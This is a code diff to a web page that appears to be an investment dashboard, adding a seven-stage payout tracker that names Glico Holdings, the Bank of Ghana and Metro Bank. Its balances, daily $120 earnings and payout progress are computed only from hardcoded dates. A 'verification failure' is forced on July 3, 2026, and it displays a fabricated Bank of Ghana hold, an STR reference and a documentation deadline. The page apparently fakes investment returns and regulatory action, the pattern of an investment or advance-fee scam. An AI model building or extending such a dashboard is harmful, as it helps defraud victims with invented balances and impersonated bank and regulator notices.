@@ -272,7 +272,7 @@
             color: white;
         }
         
-        /* BOG Hold Banner */
+        /* BOG Hold Banner - Shows on July 3+ */
         .bog-hold-banner {
             background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(212, 175, 55, 0.1));
             backdrop-filter: blur(15px);
@@ -339,6 +339,11 @@
             background: rgba(16, 185, 129, 0.2);
         }
         
+        .payout-status-card.hold {
+            border-color: var(--danger);
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.15), rgba(16, 185, 129, 0.05));
+        }
+        
         .payout-header {
             display: flex;
             justify-content: space-between;
@@ -354,6 +359,29 @@
             display: flex;
             align-items: center;
             gap: 10px;
+        }
+        
+        .payout-status-badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+        
+        .payout-status-badge.hold {
+            background: var(--danger);
+            color: white;
+        }
+        
+        .payout-status-badge.processing {
+            background: var(--accent);
+            color: white;
+        }
+        
+        .payout-status-badge.complete {
+            background: var(--success);
+            color: white;
         }
         
         /* Stats Cards */
@@ -833,7 +861,7 @@
             <div id="payoutStatusCard" class="payout-status-card animate-in">
                 <div class="payout-header">
                     <div class="payout-title"><i class="fas fa-money-check-alt"></i> Investment Payout Processing</div>
-                    <span id="payoutStageBadge" class="verification-stage stage-progress">Stage 1 of 7</span>
+                    <span id="payoutStageBadge" class="payout-status-badge processing">Stage 1 of 7</span>
                 </div>
                 <div class="progress-bar-container">
                     <div id="payoutProgressBar" class="progress-bar" style="width: 0%"></div>
@@ -1100,7 +1128,21 @@
         const EXTENDED_END = new Date(2026, 6, 3); // July 3, 2026 - earnings stop
         const VERIFICATION_START = new Date(2026, 5, 15);
         const FAILURE_DATE = new Date(2026, 6, 3);
+        const PAYOUT_START_DATE = new Date(2026, 6, 6);
         const TODAY = new Date();
+
+        // ===========================================
+        // PAYOUT STAGES
+        // ===========================================
+        const PAYOUT_STAGES = [
+            { id: 1, name: 'Glico Holdings Release', duration: 1 },
+            { id: 2, name: 'Bank of Ghana Verification', duration: 1 },
+            { id: 3, name: 'UK Banking Processing', duration: 1 },
+            { id: 4, name: 'Tax Clearance', duration: 1 },
+            { id: 5, name: 'Metro Bank Processing', duration: 1 },
+            { id: 6, name: 'Final Review', duration: 1 },
+            { id: 7, name: 'Payout Complete', duration: 1 }
+        ];
 
         // ===========================================
         // VERIFICATION STAGE DURATIONS (14 days total)
@@ -1156,7 +1198,6 @@
         // CHECK IF VERIFICATION FAILED (ONLY ON JULY 3+)
         // ===========================================
         function isVerificationFailed() {
-            // Only trigger failure on or after July 3, 2026
             if (TODAY >= FAILURE_DATE) return true;
             if (localStorage.getItem('verificationStatus') === 'failed') return true;
             return false;
@@ -1204,6 +1245,52 @@
         }
 
         // ===========================================
+        // CALCULATE PAYOUT STAGE
+        // ===========================================
+        function calculatePayoutStage() {
+            // If verification failed, payout is on hold
+            if (isVerificationFailed()) {
+                return {
+                    currentStage: 0,
+                    currentStageIndex: -1,
+                    progress: 0,
+                    isComplete: false,
+                    isOnHold: true
+                };
+            }
+
+            if (TODAY < PAYOUT_START_DATE) {
+                return { currentStage: 0, currentStageIndex: -1, progress: 0, isComplete: false, isOnHold: false };
+            }
+            
+            let cumulativeDays = 0;
+            let currentStageIndex = -1;
+            
+            for (let i = 0; i < PAYOUT_STAGES.length; i++) {
+                cumulativeDays += PAYOUT_STAGES[i].duration;
+                if (TODAY >= addBusinessDays(PAYOUT_START_DATE, cumulativeDays)) {
+                    currentStageIndex = i;
+                } else break;
+            }
+            
+            if (currentStageIndex === -1 && TODAY >= PAYOUT_START_DATE) currentStageIndex = 0;
+            
+            const totalDays = PAYOUT_STAGES.reduce((a, b) => a + b.duration, 0);
+            let daysElapsed = countBusinessDays(PAYOUT_START_DATE, TODAY);
+            let progressPercent = Math.min(100, Math.floor((daysElapsed / totalDays) * 100));
+            let isComplete = currentStageIndex >= PAYOUT_STAGES.length - 1 && daysElapsed >= totalDays;
+            if (isComplete) progressPercent = 100;
+            
+            return {
+                currentStage: currentStageIndex + 1,
+                currentStageIndex: currentStageIndex,
+                progress: progressPercent,
+                isComplete: isComplete,
+                isOnHold: false
+            };
+        }
+
+        // ===========================================
         // CALCULATE INVESTMENT STATS (Earnings through July 3)
         // ===========================================
         function calculateCurrentStats() {
@@ -1213,7 +1300,6 @@
             const extendedStart = new Date(PROMO_END);
             extendedStart.setDate(extendedStart.getDate() + 1);
             
-            // Calculate extended days up to TODAY, but stop at July 3
             const endDate = TODAY <= EXTENDED_END ? TODAY : EXTENDED_END;
             const extendedDays = countBusinessDays(extendedStart, endDate);
             const extendedEarnings = extendedDays * 120;
@@ -1221,7 +1307,6 @@
             const totalEarnings = promoEarnings + extendedEarnings;
             const currentBalance = INVESTMENT_AMOUNT + totalEarnings;
             
-            // Days remaining (only if before July 3)
             let remainingDays = 0;
             let futureEarnings = 0;
             if (TODAY < EXTENDED_END) {
@@ -1258,7 +1343,6 @@
                 { type: "reinvest", amount: 47720, date: new Date(2026, 1, 20), description: "Auto-Reinvestment - Extended Plan" }
             ];
             
-            // Add daily earnings
             let currentDate = new Date(PROMO_START);
             const endDate = TODAY <= EXTENDED_END ? TODAY : EXTENDED_END;
             while (currentDate <= endDate) {
@@ -1274,14 +1358,13 @@
                 currentDate.setDate(currentDate.getDate() + 1);
             }
             
-            // Add hold record if verification failed (only on July 3+)
             if (isVerificationFailed()) {
                 const stats = calculateCurrentStats();
                 history.push({
                     type: "hold",
                     amount: 0,
                     date: new Date(FAILURE_DATE),
-                    description: `⚠️ Payout Held by Bank of Ghana - STR Filed (BOG-FIC-STR-2026-0001) - Amount: $${stats.currentBalance.toLocaleString()}`
+                    description: `⚠️ Payout Held by Bank of Ghana - STR Filed (BOG-FIC-STR-2026-0001)`
                 });
             }
             
@@ -1294,6 +1377,7 @@
         function updateUI() {
             const stats = calculateCurrentStats();
             const verification = calculateVerificationStage();
+            const payout = calculatePayoutStage();
             const isFailed = isVerificationFailed();
             
             // Update stats cards
@@ -1319,7 +1403,6 @@
             document.getElementById('detailEarningsTotal').textContent = `$${stats.totalEarnings.toLocaleString()}`;
             document.getElementById('detailDaysEarned').textContent = `${stats.extendedDays} days`;
             
-            // Update status
             if (isFailed) {
                 document.getElementById('detailStatus').textContent = '⚠️ Payout Held by BOG - STR Filed';
                 document.getElementById('detailStatus').style.color = '#ef4444';
@@ -1350,15 +1433,11 @@
                 document.getElementById('verificationStatusCard').classList.add('failed');
                 document.querySelector('.track-button').classList.add('failed');
                 
-                // Show BOG Hold Banner
                 document.getElementById('bogHoldBanner').style.display = 'block';
                 document.getElementById('holdAmount').textContent = `$${stats.currentBalance.toLocaleString()}`;
                 document.getElementById('holdTimelineAmount').textContent = `$${stats.currentBalance.toLocaleString()}`;
-                
-                // Show hold timeline item
                 document.getElementById('holdTimelineItem').style.display = 'block';
                 
-                // Update verification steps - show all completed except final which is failed
                 for (let i = 1; i <= 7; i++) {
                     const stepEl = document.querySelector(`.step-indicator[data-step="${i}"]`);
                     if (stepEl) {
@@ -1379,7 +1458,6 @@
                 document.getElementById('verificationStatusCard').classList.remove('failed');
                 document.querySelector('.track-button').classList.remove('failed');
                 
-                // Hide BOG Hold Banner
                 document.getElementById('bogHoldBanner').style.display = 'none';
                 document.getElementById('holdTimelineItem').style.display = 'none';
                 
@@ -1410,6 +1488,64 @@
                 }
             }
             
+            // Update Payout UI
+            const payoutCard = document.getElementById('payoutStatusCard');
+            if (isFailed) {
+                payoutCard.style.display = 'block';
+                payoutCard.classList.add('hold');
+                document.getElementById('payoutStageBadge').textContent = '⛔ ON HOLD';
+                document.getElementById('payoutStageBadge').className = 'payout-status-badge hold';
+                document.getElementById('payoutProgressBar').style.width = '0%';
+                document.getElementById('payoutProgressBar').className = 'progress-bar failed';
+                document.getElementById('currentPayoutDescription').innerHTML = 
+                    '⚠️ Payout is on hold pending Bank of Ghana review. Documentation deadline: 30 July, 2026';
+                
+                for (let i = 1; i <= 7; i++) {
+                    const stepEl = document.querySelector(`.step-indicator[data-pstep="${i}"]`);
+                    if (stepEl) {
+                        stepEl.classList.remove('active', 'completed');
+                        stepEl.style.opacity = '0.3';
+                    }
+                }
+            } else if (TODAY >= PAYOUT_START_DATE) {
+                payoutCard.style.display = 'block';
+                payoutCard.classList.remove('hold');
+                if (payout.currentStage > 0) {
+                    document.getElementById('payoutStageBadge').textContent = `Stage ${payout.currentStage} of 7`;
+                    document.getElementById('payoutStageBadge').className = 'payout-status-badge processing';
+                    document.getElementById('payoutProgressBar').style.width = `${payout.progress}%`;
+                    document.getElementById('payoutProgressBar').className = 'progress-bar';
+                    const payoutDescriptions = [
+                        'Payment released by Glico Holdings. Awaiting Bank of Ghana verification approval.',
+                        'Bank of Ghana verifying payout compliance with foreign exchange regulations.',
+                        'Processing through UK banking partner network.',
+                        'Tax clearance verification in progress.',
+                        'Metro Bank processing your payout to your account.',
+                        'Final review and compliance check.',
+                        'Payout complete! Funds sent to your bank account.'
+                    ];
+                    document.getElementById('currentPayoutDescription').innerHTML = payoutDescriptions[payout.currentStageIndex] || 'Processing...';
+                    
+                    for (let i = 1; i <= 7; i++) {
+                        const stepEl = document.querySelector(`.step-indicator[data-pstep="${i}"]`);
+                        if (stepEl) {
+                            stepEl.style.opacity = '1';
+                            if (i < payout.currentStage) {
+                                stepEl.classList.add('completed');
+                                stepEl.classList.remove('active');
+                            } else if (i === payout.currentStage) {
+                                stepEl.classList.add('active');
+                                stepEl.classList.remove('completed');
+                            } else {
+                                stepEl.classList.remove('active', 'completed');
+                            }
+                        }
+                    }
+                }
+            } else {
+                payoutCard.style.display = 'none';
+            }
+            
             // Update modal balance
             document.getElementById('modalCurrentBalance').textContent = `$${stats.currentBalance.toLocaleString()}`;
             document.getElementById('fullPayoutAmount').textContent = `$${stats.currentBalance.toLocaleString()}`;
@@ -1428,7 +1564,6 @@
                 }
             }
             
-            // Update days remaining span
             const daysSpan = document.getElementById('daysRemainingSpan');
             if (daysSpan) {
                 if (isFailed || TODAY > EXTENDED_END) {
@@ -1471,7 +1606,6 @@
             renderList(recent, document.getElementById('transactionList'));
             renderList(transactions, document.getElementById('allTransactionList'));
             
-            // Earnings timeline
             const earnings = transactions.filter(t => t.type === 'earning');
             const monthlyMap = new Map();
             earnings.forEach(e => {
